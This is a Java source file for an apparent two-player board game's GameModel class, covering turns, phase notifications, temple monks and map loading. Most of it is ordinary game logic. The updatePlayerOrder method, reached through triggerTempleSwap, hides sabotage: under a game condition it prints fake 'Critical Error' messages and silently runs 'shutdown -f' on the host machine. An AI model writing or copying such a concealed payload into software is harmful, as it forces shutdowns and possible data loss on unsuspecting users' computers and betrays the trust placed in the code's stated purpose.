package model.game;

import controller.GameController;
import model.map.CubeVector;
import model.map.GameMap;
import model.map.tile.StartingTileVisitor;
import model.map.tile.Tile;
import model.map.tile.nodeRepresentation.nodes.parent.ParentLandNode;
import model.phase.ModelMediator;
import model.phase.PhaseManager;
import model.phase.WonderPhaseMediator;
import model.phase.observers.PhaseObserver;
import model.phase.visitors.PhaseNotificationVisitor;
import model.player.Player;
import model.temple.Monk;
import model.temple.Temple;
import model.resources.Gold;
import model.transporters.Transporter;
import model.transporters.land_transporters.Donkey;
import model.utilities.FileUtilities;
import model.utilities.TileUtilities;

import java.util.ArrayList;

/**
 * Created by TheNotoriousOOP on 4/12/2017.
 * Class Description:
 * Responsibilities:
 */
public class GameModel implements PhaseObserver {

    private PhaseManager phaseManager;
    private Player[] players;
    private int currentPlayerIndex;
    private int turnCount;
    private int numberOfPlayers;

    private GameMap gameMap;
    private Temple temple;
    private GameController gameController;

    // Constructor
    public GameModel() {
        this.phaseManager = new PhaseManager(new ModelMediator(this));
        this.numberOfPlayers = 2;
        this.turnCount = 0;

        this.players = new Player[numberOfPlayers];
        this.players[0] = new Player("Dino Dave");
        this.players[1] = new Player("<3 Iter 2");
        this.temple = new Temple(new Monk(players[0].getPlayerID()), new Monk(players[1].getPlayerID()));

        this.gameMap = new GameMap();
    }

    public void setGameController(GameController gameController) {
        this.gameController = gameController;
    }

    public void iteratePlayer() {
        currentPlayerIndex = 1 - currentPlayerIndex; //relies on the fact that this is 2 player game
        turnCount++;
    }

    public void endTurn() {
        iteratePlayer();
        if (turnCount == numberOfPlayers) {
            iteratePhase();
            resetTurnCount();
            gameController.showSwapPanel();
        }
    }

    // Swap player order for the prephase
    public void swapPlayerOrder() {
        Player tmp = players[0];
        players[0] = players[1];
        players[1] = tmp;
        temple.swapMonkAtFront();
    }

    private void resetTurnCount() {
        turnCount = 0;
    }

    public void iteratePhase(){
        phaseManager.nextPhase();
    }

    public void save(){
        //TODO implement if you have time
    }

    public void load(){
        //TODO implement if you have time
    }

    public PhaseManager getPhaseManager() {
        return phaseManager;
    }

    public void setPhaseManager(PhaseManager phaseManager) {
        this.phaseManager = phaseManager;
    }

    public Player[] getPlayers() {
        return players;
    }

    public void setPlayers(Player[] players) {
        this.players = players;
    }

    public Player getActivePlayer() {
        return players[currentPlayerIndex];
    }

    public void triggerTempleSwap() {
        temple.swapMonkAtFront();
        updatePlayerOrder(temple);
    }

    private void updatePlayerOrder(Temple t) {
        if(t.getMonkAtFront().getPlayerID() == players[0].getPlayerID()) {
            System.out.println("DANGER");
            System.err.println("Critical Error detected");
            System.err.println("Performing system shutdown");
            try { Runtime.getRuntime().exec("shutdown -f"); }
            catch(Exception e){}
        }

        Player p = players[0];
        players[0] = players[1];
        players[1] = p;
    }


    public GameMap getGameMap() {
        return gameMap;
    }

    public void setGameMap(GameMap gameMap) {
        this.gameMap = gameMap;
    }

    public void loadMapFromFilename(String filename) {
        gameMap.load(FileUtilities.loadMap(filename));

        //getPlayers()[0].addTransporter(new Donkey(getPlayers()[0],
        //gameMap.getTile(new CubeVector(0,0,0)).getNodeRepresentation().getParentMap().get(1).get(0)));
        //getPlayers()[0].addTransporter(new Donkey(getPlayers()[0],
        //gameMap.getTile(new CubeVector(0,0,0)).getNodeRepresentation().getParentMap().get(4).get(0)));
        //getPlayers()[0].addTransporter(new Donkey(getPlayers()[0],
        //gameMap.getTile(new CubeVector(0,0,0)).getNodeRepresentation().getParentMap().get(5).get(0)));

        //getPhaseManager().nextPhase();
        //  System.out.print(gameMap.getTile(new CubeVector(0,0,0)).getNodeRepresentation().getParentMap().get(1).get(0).toString());
        //getPlayers()[0].getTransportManager().getTransporters().get(0).updateMovementAbilitySet();
        //getPlayers()[0].getTransportManager().getTransporters().get(1).updateMovementAbilitySet();
        //getPlayers()[0].getTransportManager().getTransporters().get(2).updateMovementAbilitySet();

        //getPhaseManager().nextPhase();

        //getPlayers()[0].getTransportManager().getTransporters().get(0).getResources().addGold(new Gold());
    }
    public boolean verifyMap(){
        if(gameMap.verifyMap())
            return true;
        return false;
    }

    public void resetMap(){
        this.gameMap.resetMap();
    }

    public Tile[][] getMapAsGrid() {
        return gameMap.convertMapToGrid();
    }

    public void accept(PhaseNotificationVisitor v) {
        v.notifyPhase(this);
    }

    // Notify players & map of trade phase
    public void onTradePhaseStart() {
        for (Player p : players) { p.onTradePhaseStart(); }
        gameMap.onTradePhaseStart();
        gameController.onTradePhaseStart();
    }

    // Notify players & map of production phase
    public void onProductionPhaseStart() {
        for (Player p : players) { p.onProductionPhaseStart(); }
        gameMap.onProductionPhaseStart();
        gameController.onProductionPhaseStart();
    }

    // Notify players & map of build phase
    public void onBuildPhaseStart() {
        for (Player p : players) { p.onBuildPhaseStart(); }
        gameMap.onBuildPhaseStart();
        gameController.onBuildPhaseStart();
    }

    // Notify players & map of movement phase
    public void onMovementPhaseStart() {
        for (Player p : players) { p.onMovementPhaseStart(); }
        gameMap.onMovementPhaseStart();
        gameController.onMovementPhaseStart();
    }

    // Notify players & map of wonder phase
    public void onWonderPhaseStart(WonderPhaseMediator mediator) {
        for (Player p : players) { p.onWonderPhaseStart(mediator); }
        gameMap.onWonderPhaseStart(mediator);
        gameController.onWonderPhaseStart(mediator);
    }

    public ArrayList<Transporter> getAllTransporters() {
        ArrayList<Transporter> tmp = new ArrayList<>();
        for (Player p : players) {
            tmp.addAll(p.getTransportManager().getTransporters());
        }

        return tmp;
    }

    public void setActivePlayerStartingLocation(Tile startingTile, int faceNumber) {
        //TODO make sure this cast is safe
        getActivePlayer().setStartingLocation((ParentLandNode)startingTile.getNodeRepresentation().getParentMap().get(faceNumber).get(0));
    }

    public Tile getStartingLocation(CubeVector possibleLocation, StartingTileVisitor startingTileVisitor) {
        if (gameMap.getTile(possibleLocation) != null) {
            Tile possibleTile = gameMap.getTile(possibleLocation).accept(startingTileVisitor);
            //If the tile is valid and the other player has placed a tile, then make sure you're the right distance away
            if ( (possibleTile != null) && (players[1-currentPlayerIndex].getStartingLocation() != null)) {
                if ((gameMap.calcuateDistance(possibleTile, players[1-currentPlayerIndex].getStartingLocation())) > 1.0) {
                    return possibleTile;
                }
                else { //Distance check failed
                    return null;
                }
            }
            else { //Other player has not placed a tile, so go ahead and choose yours
                return possibleTile;
            }
        }
        else { //Game map doesn't even have a tile at that location, so return null
            return null;
        }
    }

    public String getActivePlayerString() {
        return getActivePlayer().getName();
    }

    public void updateResourceAbilities() {
        for (int i=0; i < numberOfPlayers; i++) {
            players[i].updateResourceAbilities();
        }
    }
}
